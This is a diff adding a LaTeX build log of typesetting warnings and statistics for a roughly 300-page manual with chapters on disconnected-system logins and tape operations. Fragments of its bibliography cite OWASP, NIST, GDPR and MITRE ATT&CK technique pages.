+Underfull \hbox (badness 10000) in paragraph at lines 628--631
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 628--631
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 632--635
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 632--635
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 632--635
+
+ []
+
+[223]
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 646--670
+
+ []
+
+[224]
+Underfull \hbox (badness 10000) in paragraph at lines 674--675
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 676--688
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 676--688
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 676--688
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 676--688
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 676--688
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 676--688
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 676--688
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 676--688
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 676--688
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 676--688
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 676--688
+
+ []
+
+[225]
+Underfull \hbox (badness 10000) in paragraph at lines 690--692
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 693--695
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 693--695
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 701--703
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 704--705
+
+ []
+
+[226]
+Underfull \hbox (badness 10000) in paragraph at lines 706--707
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 708--710
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 711--719
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 711--719
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 711--719
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 711--719
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 711--719
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 711--719
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 711--719
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 720--721
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 722--732
+
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [227]
+Underfull \hbox (badness 10000) in paragraph at lines 737--743
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 737--743
+
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 746--748
+
+ []
+
+[228]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [229]
+Underfull \hbox (badness 10000) in paragraph at lines 796--797
+
+ []
+
+) (./chapters/disconnected_login.tex [230]
+Chapter 8.
+[231
+
+] [232]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [233]
+Overfull \hbox (19.09332pt too wide) in paragraph at lines 117--121
+[]\TU/LiberationSerif(0)/m/n/10 2. Dismount media. []\TU/LiberationMono(0)/m/n/
+10 zfs export [DATASET_NAME]\TU/LiberationSerif(0)/m/n/10 [8] []\TU/LiberationM
+ono(0)/m/n/10 geli detatch
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [234]
+Overfull \hbox (10.8718pt too wide) in paragraph at lines 147--148
+\TU/LiberationSerif(0)/m/n/10 drives on a machine. Many machines are being buil
+t and sold with on-[]motherboard
+ []
+
+[235]) (./chapters/tape_operations.tex [236]
+Chapter 9.
+[237
+
+]
+Overfull \hbox (17.12445pt too wide) in paragraph at lines 160--161
+\TU/LiberationMono(0)/m/n/10 echo "Back up to 0 and go forward space count 2 fi
+les." 
+ []
+
+
+Overfull \hbox (17.12445pt too wide) in paragraph at lines 160--161
+\TU/LiberationMono(0)/m/n/10 echo "Back up to 0 and go forward space count 3 fi
+les." 
+ []
+
+
+Underfull \hbox (badness 10000) in paragraph at lines 160--161
+
+ []
+
+[238]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [239]
+Underfull \hbox (badness 10000) in paragraph at lines 164--165
+
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [240]
+Underfull \hbox (badness 10000) in paragraph at lines 166--167
+
+ []
+
+
+Underfull \vbox (badness 2529) has occurred while \output is active []
+
+ [241])
+[242] (./ut_test.ent
+LaTeX Font Info:    Font shape `TU/LiberationMono(0)/m/n' will be
+(Font)              scaled to size 8.0pt on input line 11.
+ [243
+
+
+
+]
+Overfull \hbox (17.56436pt too wide) in paragraph at lines 575--677
+[]\TU/LiberationSerif(0)/m/n/8 [14]_____. SCRT Information Security, ”https://w
+ww.scrt.ch/en/[]attack/downloads/mini-mysqlat0r”
+ []
+
+
+Overfull \hbox (10.80809pt too wide) in paragraph at lines 754--759
+[]\TU/LiberationSerif(0)/m/n/8 [18]_____. ”https://www.nist.gov/news-events/eve
+nts/2017/03/cybersecurity-framework-virtual-
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [244]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [245]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [246]
+Overfull \hbox (0.12085pt too wide) in paragraph at lines 2679--2684
+[]\TU/LiberationSerif(0)/m/n/8 [64]_____. ”https://owasp.org/index.php/Top_10_2
+013-Top_10” OWASP, 2017. INTERNET. 
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [247]
+Overfull \hbox (4.96416pt too wide) in paragraph at lines 3136--3140
+[]\TU/LiberationSerif(0)/m/n/8 [87]_____. WindowsVM, ”https://www.microsoft.com
+/en-us/download/details.aspx?id=3702”.
+ []
+
+[248] [249]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [250]
+[251]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [252]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [253]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [254]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [255]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [256]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [257]
+Overfull \hbox (13.64795pt too wide) in paragraph at lines 7967--7988
+[]\TU/LiberationSerif(0)/m/n/8 [6]—. “Data Manipulation, Technique T1565 - Ente
+rprise | MITRE ATT&CK®.” []attack.Mitre.Org,
+ []
+
+
+Overfull \hbox (12.016pt too wide) in paragraph at lines 8066--8083
+[]\TU/LiberationSerif(0)/m/n/8 [11]“Develop Capabilities, Technique T1587 - Ent
+erprise | MITRE ATT&CK®.” []attack.Mitre.Org,
+ []
+
+
+Overfull \hbox (34.10066pt too wide) in paragraph at lines 8085--8105
+[]\TU/LiberationSerif(0)/m/n/8 [12]“Disable or Modify System []firewall, Techni
+que T1686 - Enterprise | MITRE ATT&CK®.” Mitre.Org,
+ []
+
+[258]
+Overfull \hbox (1.99779pt too wide) in paragraph at lines 8107--8125
+[]\TU/LiberationSerif(0)/m/n/8 [13]“Disable or Modify Tools, Technique T1685 - 
+Enterprise | MITRE ATT&CK®.” Mitre.Org,
+ []
+
+
+Overfull \hbox (46.8702pt too wide) in paragraph at lines 8145--8164
+[]\TU/LiberationSerif(0)/m/n/8 [15]“Domain or Tenant Policy Modification, Techn
+ique T1484 - Enterprise | MITRE ATT&CK®.” Mitre.Org,
+ []
+
+
+Overfull \hbox (10.25038pt too wide) in paragraph at lines 8185--8202
+[]\TU/LiberationSerif(0)/m/n/8 [17]“Event Triggered Execution, Technique T1546 
+- Enterprise | MITRE ATT&CK®.” Mitre.Org,
+ []
+
+
+Overfull \hbox (2.02434pt too wide) in paragraph at lines 8204--8220
+[]\TU/LiberationSerif(0)/m/n/8 [18]“Exclusive Control, Technique T1668 - Enterp
+rise | MITRE ATT&CK®.” Mitre.Org, 2026,
+ []
+
+
+Overfull \hbox (36.322pt too wide) in paragraph at lines 8240--8258
+[]\TU/LiberationSerif(0)/m/n/8 [20]“Exfiltration Over Physical Medium, Techniqu
+e T1052 - Enterprise | MITRE ATT&CK®.” Mitre.Org,
+ []
+
+
+Overfull \hbox (3.78996pt too wide) in paragraph at lines 8355--8371
+[]\TU/LiberationSerif(0)/m/n/8 [26]“Indicator Removal, Technique T1070 - Enterp
+rise | MITRE ATT&CK®.” Mitre.Org, 2026,
+ []
+
+
+Overfull \hbox (2.92226pt too wide) in paragraph at lines 8392--8409
+[]\TU/LiberationSerif(0)/m/n/8 [28]“Inhibit System Recovery, Technique T1490 - 
+Enterprise | MITRE ATT&CK®.” Mitre.Org,
+ []
+
+
+Overfull \hbox (9.51973pt too wide) in paragraph at lines 8469--8488
+[]\TU/LiberationSerif(0)/m/n/8 [32]“Modify Cloud Compute Infrastructure, Techni
+que T1578 - Enterprise | MITRE ATT&CK®.”
+ []
+
+
+Overfull \hbox (1.00104pt too wide) in paragraph at lines 8590--8609
+[]\TU/LiberationSerif(0)/m/n/8 [38]“[]OS Credential Dumping, Technique T1003 - 
+Enterprise | MITRE ATT&CK®.” Mitre.Org,
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [259]
+Overfull \hbox (15.22044pt too wide) in paragraph at lines 8631--8649
+[]\TU/LiberationSerif(0)/m/n/8 [40]“Poisoned Pipeline Execution, Technique T167
+7 - Enterprise | MITRE ATT&CK®.” Mitre.Org,
+ []
+
+
+Overfull \hbox (1.97676pt too wide) in paragraph at lines 8690--8709
+[]\TU/LiberationSerif(0)/m/n/8 [43]”Prevent Command History Logging, Technique 
+T1690 - Enterprise | MITRE ATT&CK®.”
+ []
+
+
+Overfull \hbox (3.65013pt too wide) in paragraph at lines 8767--8785
+[]\TU/LiberationSerif(0)/m/n/8 [47]”Reflective Code Loading, Technique T1620 - 
+Enterprise | MITRE ATT&CK®.” Mitre.Org,
+ []
+
+
+Overfull \hbox (6.45482pt too wide) in paragraph at lines 8807--8825
+[]\TU/LiberationSerif(0)/m/n/8 [49]”Rogue Domain Controller, Technique T1207 - 
+Enterprise | MITRE ATT&CK®.” Mitre.Org,
+ []
+
+
+Overfull \hbox (14.322pt too wide) in paragraph at lines 8903--8921
+[]\TU/LiberationSerif(0)/m/n/8 [54]“Server Software Component, Technique T1505 
+- Enterprise | MITRE ATT&CK®.” Mitre.Org,
+ []
+
+
+Overfull \hbox (13.322pt too wide) in paragraph at lines 8923--8941
+[]\TU/LiberationSerif(0)/m/n/8 [55]“Software Deployment Tools, Technique T1072 
+- Enterprise | MITRE ATT&CK®.” Mitre.Org,
+ []
+
+
+Overfull \hbox (1.35378pt too wide) in paragraph at lines 8943--8960
+[]\TU/LiberationSerif(0)/m/n/8 [56]“Stage Capabilities, Technique T1608 - Enter
+prise | MITRE ATT&CK®.” Mitre.Org, 2026,
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [260]
+Overfull \hbox (10.90036pt too wide) in paragraph at lines 9293--9317
+[]\TU/LiberationSerif(0)/m/n/8 [68]Wolford, Ben. “Everything You Need to Know A
+bout the ‘Right to Be Forgotten.’” []GDPR.Eu,
+ []
+
+
+Overfull \hbox (4.45909pt too wide) in paragraph at lines 9319--9347
+[]\TU/LiberationSerif(0)/m/n/8 [69][]GDPR. “Art. 17 []GDPR - Right to Erasure (
+‘Right to Be Forgotten’) - []GDPR.Eu.” []GDPR.Eu,
+ []
+
+
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [261]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [262]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [263]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [264]
+Underfull \vbox (badness 10000) has occurred while \output is active []
+
+ [265]
+Overfull \hbox (0.8139pt too wide) in paragraph at lines 10733--10733
+|\TU/LiberationSans(0)/b/n/12 Chapter 8: Login Procedures for Disconnected Syst
+ems| 
+ []
+
+
+Underfull \vbox (badness 2065) has occurred while \output is active []
+
+ [266])
+(./ut_test.gls [267] [268
+
+]
+\enotechapsep{0}{\glossarytitle }
+\openout4 = `ut_test.ent'.
+
+[269
+
+] [270] [271] [272] [273] [274]) [275] [276
+
+]
+runsystem(makeindex ut_test.idx)...executed safely (allowed).
+
+ (./ut_test.ind [277
+
+] [278]
+[279]) [280] (./ut_test.aux)
+ ***********
+LaTeX2e <2023-11-01> patch level 1
+L3 programming layer <2024-01-22>
+ ***********
+
+
+LaTeX Warning: There were multiply-defined labels.
+
+Package rerunfilecheck Info: File `ut_test.out' has not changed.
+(rerunfilecheck)             Checksum: 9F1CAF77FC3F4AEFBA971C362AEB4C92;32366.
+ ) 
+Here is how much of TeX's memory you used:
+ 26268 strings out of 476878
+ 496560 string characters out of 5805250
+ 2124627 words of memory out of 5000000
+ 47697 multiletter control sequences out of 15000+600000
+ 563934 words of font info for 118 fonts, out of 8000000 for 9000
+ 14 hyphenation exceptions out of 8191
+ 91i,22n,117p,5869b,1724s stack positions out of 10000i,1000n,20000p,200000b,200000s
+
+Output written on ut_test.xdv (300 pages, 6323676 bytes).
